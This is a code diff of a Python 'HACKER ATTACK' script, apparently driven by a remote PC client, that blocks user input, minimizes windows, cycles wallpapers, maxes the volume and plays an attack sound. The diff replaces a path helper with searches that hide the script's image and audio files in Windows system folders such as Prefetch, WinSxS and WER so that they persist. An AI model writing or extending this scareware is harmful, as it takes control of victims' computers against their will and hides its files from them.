@@ -12,74 +12,13 @@ import time
 import tempfile
 import random
 
-# Import standardized path utilities
-# When scripts are executed by PC client, they might be in a temp location
-# So we need robust path resolution that works in all scenarios
-import os
-import sys
-
-def _get_base_path():
-    """Get base path (executable directory) - works in all execution contexts"""
-    # Priority 1: Check if running as executable (PyInstaller frozen)
-    if getattr(sys, 'frozen', False):
-        return os.path.dirname(sys.executable)
-    
-    # Priority 2: Check PC_CLIENT_PATH environment variable (set by PC client)
-    pc_client_path = os.environ.get("PC_CLIENT_PATH", "")
-    if pc_client_path and os.path.exists(pc_client_path):
-        return os.path.abspath(pc_client_path)
-    
-    # Priority 3: Try to get from __file__ (when script is imported/executed normally)
-    try:
-        if '__file__' in globals():
-            script_path = os.path.abspath(__file__)
-            script_dir = os.path.dirname(script_path)
-            # If script is in Scripts folder, go up one level
-            if os.path.basename(script_dir) == 'Scripts':
-                return os.path.dirname(script_dir)
-            return script_dir
-    except (NameError, AttributeError):
-        pass
-    
-    # Priority 4: Try to get from sys.argv[0] (script being executed)
-    try:
-        if sys.argv and len(sys.argv) > 0:
-            script_path = os.path.abspath(sys.argv[0])
-            script_dir = os.path.dirname(script_path)
-            # If script is in Scripts folder, go up one level
-            if os.path.basename(script_dir) == 'Scripts':
-                return os.path.dirname(script_dir)
-            return script_dir
-    except (AttributeError, IndexError):
-        pass
-    
-    # Priority 5: Fallback to current working directory
-    return os.path.abspath(os.getcwd())
-
-# Try to import path_utils, but use inline functions as fallback
-try:
-    # Add script directory to path if needed
-    script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.path.dirname(os.path.abspath(sys.argv[0]))
-    if script_dir not in sys.path:
-        sys.path.insert(0, script_dir)
-    from path_utils import get_photos_path, get_audios_path, find_folder, get_base_path
-except (ImportError, Exception):
-    # Fallback: use inline implementation
-    def get_base_path():
-        return _get_base_path()
-    def get_photos_path():
-        return os.path.join(_get_base_path(), "Photos")
-    def get_audios_path():
-        return os.path.join(_get_base_path(), "Audios")
-    def find_folder(folder_name):
-        path = os.path.join(_get_base_path(), folder_name)
-        if os.path.exists(path) and os.path.isdir(path):
-            return path
-        return None
-
 print("=" * 60)
 print("   HACKER ATTACK - INITIALIZING...")
 print("=" * 60)
+
+# Find client directory for wallpaper
+script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else os.getcwd()
+pc_client_path = os.environ.get("PC_CLIENT_PATH", script_dir)
 
 # Global flag to control input blocking
 input_blocking_active = True
@@ -152,17 +91,30 @@ def minimize_all_windows():
 # ============================================
 def find_photos_folder():
     """Find the Photos folder containing 1.jpg through 9.jpg
-    Uses standardized path resolution (executable directory)"""
-    # Use standardized path utilities to find Photos folder
-    photos_folder = find_folder("Photos")
-    if photos_folder:
-        return photos_folder
+    Searches system locations first (as deployed by PC client v2.1+)"""
+    # System locations (deployed by PC client - most persistent)
+    localappdata = os.environ.get('LOCALAPPDATA', '')
+    search_paths = [
+        # System locations (deployed by PC client v2.1+)
+        os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
+        r"C:\ProgramData\Microsoft\Windows\WER\Photos",
+        r"C:\Windows\Prefetch\Photos",
+        r"C:\Windows\WinSxS\Photos",
+        # Fallback locations
+        os.path.join(os.path.expanduser("~"), "Photos"),
+        os.path.join(pc_client_path, "Photos"),
+        os.path.join(os.getcwd(), "Photos"),
+        os.path.join(script_dir, "Photos"),
+        os.path.join(script_dir, "..", "Photos"),
+    ]
     
-    # Fallback to get_photos_path if folder doesn't exist yet
-    photos_path = get_photos_path()
-    if os.path.exists(photos_path) and os.path.isdir(photos_path):
-        return photos_path
+    # Filter out None values
+    search_paths = [p for p in search_paths if p is not None]
     
+    for path in search_paths:
+        abs_path = os.path.abspath(path)
+        if os.path.exists(abs_path) and os.path.isdir(abs_path):
+            return abs_path
     return None
 
 def get_photo_paths(photos_folder):
@@ -194,8 +146,18 @@ def cycle_wallpaper():
     
     if not photos_folder:
         print("    [!] Photos folder not found")
-        print(f"    [!] Expected location: {get_photos_path()}")
-        print("    [!] Please ensure Photos folder exists in executable directory")
+        print("    [!] Searched in system locations:")
+        localappdata = os.environ.get('LOCALAPPDATA', '')
+        search_paths = [
+            os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
+            r"C:\ProgramData\Microsoft\Windows\WER\Photos",
+            r"C:\Windows\Prefetch\Photos",
+            r"C:\Windows\WinSxS\Photos",
+            os.path.join(os.path.expanduser("~"), "Photos"),
+        ]
+        search_paths = [p for p in search_paths if p is not None]
+        for p in search_paths:
+            print(f"      - {p}")
         return
     
     photo_paths = get_photo_paths(photos_folder)
@@ -564,20 +526,30 @@ def max_volume():
 # 6. PLAY ATTACK AUDIO
 # ============================================
 def find_attack_audio():
-    """Find attack.mp3 in Photos folder (executable directory)"""
-    # Use standardized path resolution to find attack.mp3 in Photos folder
-    photos_folder = find_photos_folder()
-    if photos_folder:
-        attack_mp3_path = os.path.join(photos_folder, "attack.mp3")
-        if os.path.exists(attack_mp3_path):
-            return attack_mp3_path
+    """Find attack.mp3 in Photos folder (system locations first)"""
+    # Use the same search logic as Photos folder
+    localappdata = os.environ.get('LOCALAPPDATA', '')
+    search_paths = [
+        # System locations (deployed by PC client v2.1+)
+        os.path.join(localappdata, '..', 'LocalLow', 'Photos', 'attack.mp3') if localappdata else None,
+        r"C:\ProgramData\Microsoft\Windows\WER\Photos\attack.mp3",
+        r"C:\Windows\Prefetch\Photos\attack.mp3",
+        r"C:\Windows\WinSxS\Photos\attack.mp3",
+        # Fallback locations
+        os.path.join(os.path.expanduser("~"), "Photos", "attack.mp3"),
+        os.path.join(pc_client_path, "Photos", "attack.mp3"),
+        os.path.join(os.getcwd(), "Photos", "attack.mp3"),
+        os.path.join(script_dir, "Photos", "attack.mp3"),
+        os.path.join(script_dir, "..", "Photos", "attack.mp3"),
+    ]
     
-    # Fallback: check Photos path directly
-    photos_path = get_photos_path()
-    attack_mp3_path = os.path.join(photos_path, "attack.mp3")
-    if os.path.exists(attack_mp3_path):
-        return attack_mp3_path
+    # Filter out None values
+    search_paths = [p for p in search_paths if p is not None]
     
+    for path in search_paths:
+        abs_path = os.path.abspath(path)
+        if os.path.exists(abs_path):
+            return abs_path
     return None
 
 def play_attack_audio():
@@ -590,8 +562,18 @@ def play_attack_audio():
     
     if not audio_path:
         print("    [!] attack.mp3 not found in Photos folder")
-        print(f"    [!] Expected location: {os.path.join(get_photos_path(), 'attack.mp3')}")
-        print("    [!] Please ensure attack.mp3 exists in Photos folder (executable directory)")
+        print("    [!] Searched in system locations:")
+        localappdata = os.environ.get('LOCALAPPDATA', '')
+        search_paths = [
+            os.path.join(localappdata, '..', 'LocalLow', 'Photos') if localappdata else None,
+            r"C:\ProgramData\Microsoft\Windows\WER\Photos",
+            r"C:\Windows\Prefetch\Photos",
+            r"C:\Windows\WinSxS\Photos",
+            os.path.join(os.path.expanduser("~"), "Photos"),
+        ]
+        search_paths = [p for p in search_paths if p is not None]
+        for p in search_paths:
+            print(f"      - {os.path.join(p, 'attack.mp3')}")
         # If audio not found, stop attack immediately
         input_blocking_active = False
         return
